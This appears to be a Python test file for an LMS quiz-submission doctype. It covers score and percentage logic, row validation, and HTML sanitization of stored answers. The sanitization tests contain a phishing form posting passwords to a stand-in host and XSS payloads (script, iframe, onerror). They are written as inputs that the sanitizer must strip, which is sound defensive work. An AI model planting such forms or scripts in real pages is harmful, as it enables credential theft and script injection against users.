# Copyright (c) 2021, FOSS United and Contributors
# See license.txt

import unittest
from types import SimpleNamespace

import frappe

from lms.lms.doctype.lms_quiz_submission.lms_quiz_submission import LMSQuizSubmission
from lms.lms.test_helpers import BaseTestUtils, released_frappe_sanitizer, released_sanitize_html


class TestSetPercentage(unittest.TestCase):
	"""Arithmetic over three fields, so a plain object stands in for a saved document."""

	def percentage(self, score, score_out_of):
		submission = SimpleNamespace(score=score, score_out_of=score_out_of, percentage=0)
		LMSQuizSubmission.set_percentage(submission)
		return submission.percentage

	def test_percentage_is_the_share_of_the_marks_scored(self):
		self.assertEqual(self.percentage(3, 4), 75)

	def test_a_negative_score_reports_zero_rather_than_a_negative_percentage(self):
		# A negative percentage threw NonNegativeError and the attempt was never recorded.
		self.assertEqual(self.percentage(-1, 1), 0)

	def test_a_zero_score_leaves_the_percentage_alone(self):
		self.assertEqual(self.percentage(0, 4), 0)


class TestValidateMarks(unittest.TestCase):
	def submission(self, marks, percentage=0):
		rows = [SimpleNamespace(idx=i, marks=m, marks_out_of=1) for i, m in enumerate(marks, 1)]
		return SimpleNamespace(result=rows, score=None, score_out_of=len(rows), percentage=percentage)

	def test_score_is_the_sum_of_the_marks(self):
		submission = self.submission([1, -1, 1])
		LMSQuizSubmission.validate_marks(submission)
		self.assertEqual(submission.score, 1)

	def test_negative_marking_never_takes_the_score_below_zero(self):
		# Regression: negative marking showed a "-3 / 4" score (#3022, fixed in #3043).
		# Re-marking a saved submission must also reset its old percentage.
		submission = self.submission([1, -1, -1, -1, -1], percentage=80)
		LMSQuizSubmission.validate_marks(submission)
		LMSQuizSubmission.set_percentage(submission)
		self.assertEqual((submission.score, submission.percentage), (0, 0))


class TestQuizResultSanitization(BaseTestUtils):
	"""Ticket 68647 finding 3. An open-ended answer is stored as the learner typed it.

	The SPA drops form controls at render time, but reports, exports and the jinja
	portal render the stored value as authored -- so the rows are cleaned by the
	parent's validate(). A child doctype fires no doc_events of its own.
	"""

	PHISHING_FORM = (
		'<form action="https://evil.tld/steal" method="post">'
		'<input name="password" type="password"><button>Login</button></form>'
	)
	RICH_TEXT = (
		"<p><b>bold</b> <i>italic</i></p><ul><li>one</li></ul>"
		'<a href="https://ok">link</a><img src="/files/x.png">'
	)

	@classmethod
	def setUpClass(cls):
		super().setUpClass()
		question = frappe.new_doc("LMS Question")
		question.update({"question": "Explain in your own words.", "type": "Open Ended", "marks": 5})
		question.save()
		cls.question = question

		quiz = frappe.new_doc("LMS Quiz")
		quiz.update(
			{"title": f"Sanitization Quiz {frappe.generate_hash(length=6)}", "passing_percentage": 70}
		)
		quiz.append("questions", {"question": question.name, "marks": 5})
		quiz.save()
		cls.quiz = quiz

	def _submission(self, answer, question=None):
		doc = frappe.new_doc("LMS Quiz Submission")
		doc.update(
			{
				"quiz": self.quiz.name,
				"member": "Administrator",
				"score_out_of": 5,
				"passing_percentage": 70,
			}
		)
		doc.append(
			"result",
			{
				"question": question or self.question.question,
				"question_name": self.question.name,
				"question_type": "Open Ended",
				"answer": answer,
				"marks": 5,
				"marks_out_of": 5,
			},
		)
		doc.insert()
		return doc

	def _stored_row(self, doc):
		return frappe.db.get_all(
			"LMS Quiz Result", filters={"parent": doc.name}, fields=["answer", "question"]
		)[0]

	def test_a_phishing_form_in_an_answer_is_not_stored(self):
		doc = self._submission(self.PHISHING_FORM)
		stored = self._stored_row(doc).answer
		for tag in ("<form", "<input", "<button"):
			self.assertNotIn(tag, stored)
		self.assertIn("Login", stored)

	def test_a_phishing_form_in_the_question_text_is_not_stored(self):
		doc = self._submission("plain answer", question=self.PHISHING_FORM + "<b>Question?</b>")
		stored = self._stored_row(doc).question
		self.assertNotIn("<form", stored)
		self.assertIn("<b>Question?</b>", stored)

	def test_legitimate_rich_text_in_an_answer_survives(self):
		doc = self._submission(self.RICH_TEXT)
		stored = self._stored_row(doc).answer
		for markup in ("<b>bold</b>", "<li>one</li>", 'href="https://ok"', '<img src="/files/x.png">'):
			self.assertIn(markup, stored)

	def test_sanitizing_the_same_row_twice_does_not_change_it(self):
		doc = self._submission(self.PHISHING_FORM + self.RICH_TEXT)
		after_first_save = self._stored_row(doc).answer
		doc.reload()
		doc.save()
		self.assertEqual(self._stored_row(doc).answer, after_first_save)

	def test_script_iframe_and_event_handlers_are_still_stripped(self):
		doc = self._submission(
			'<script>alert(1)</script><iframe src="https://evil.tld"></iframe><img src=x onerror=alert(1)>'
		)
		stored = self._stored_row(doc).answer
		for tag in ("<script", "<iframe", "onerror"):
			self.assertNotIn(tag, stored)

	def test_json_shaped_question_is_sanitised_on_released_frappe(self):
		payload = '"<img src=x onerror=alert(1)>"'
		self.assertEqual(released_sanitize_html(payload), payload)
		with released_frappe_sanitizer():
			doc = self._submission("plain answer", question=payload)
		stored = self._stored_row(doc).question
		self.assertNotIn("onerror", stored)
		self.assertIn("<img", stored)


class TestQuizSubmissionQuestions(BaseTestUtils):
	"""Ticket 79939: repeated or foreign result rows were each scored, so the total could
	pass score_out_of. Tests added with the fix; every path that inserts is covered."""

	@classmethod
	def setUpClass(cls):
		super().setUpClass()
		cls.questions = cls._create_quiz_questions()
		cls.quiz = cls._make_quiz(cls.questions[:2])
		cls.limited_quiz = cls._make_quiz(cls.questions, shuffle_questions=1, limit_questions_to=2)

	@classmethod
	def _make_quiz(cls, questions, **settings):
		quiz = frappe.new_doc("LMS Quiz")
		quiz.update(
			{"title": f"Question Rows Quiz {frappe.generate_hash(length=6)}", "passing_percentage": 70}
		)
		quiz.update(settings)
		for question in questions:
			quiz.append("questions", {"question": question.name, "marks": 5})
		quiz.save()
		return quiz

	def _insert(self, quiz, questions):
		doc = frappe.new_doc("LMS Quiz Submission")
		doc.update(
			{
				"quiz": quiz.name,
				"member": "Administrator",
				"score_out_of": quiz.total_marks,
				"passing_percentage": 70,
			}
		)
		for question in questions:
			doc.append(
				"result",
				{
					"question_name": question.name,
					"question_type": "Choices",
					"answer": "Option 1",
					"is_correct": 1,
					"marks": 5,
					"marks_out_of": 5,
				},
			)
		return doc.insert()

	def test_one_row_per_question_is_accepted(self):
		self.assertEqual(self._insert(self.quiz, self.questions[:2]).percentage, 100)

	def test_a_question_answered_twice_is_rejected(self):
		with self.assertRaises(frappe.ValidationError):
			self._insert(self.quiz, [self.questions[0], self.questions[0]])

	def test_a_question_outside_the_quiz_is_rejected(self):
		with self.assertRaises(frappe.ValidationError):
			self._insert(self.quiz, [self.questions[0], self.questions[2]])

	def test_more_rows_than_the_attempt_shows_are_rejected(self):
		self.assertEqual(self._insert(self.limited_quiz, self.questions[:2]).percentage, 100)
		with self.assertRaises(frappe.ValidationError):
			self._insert(self.limited_quiz, self.questions)

	def test_a_graded_submission_saves_after_its_question_leaves_the_quiz(self):
		quiz = self._make_quiz(self.questions[:2])
		doc = self._insert(quiz, self.questions[:2])
		quiz.questions = quiz.questions[:1]
		quiz.save()

		doc.result[1].marks = 3
		doc.save()
		self.assertEqual(doc.score, 8)
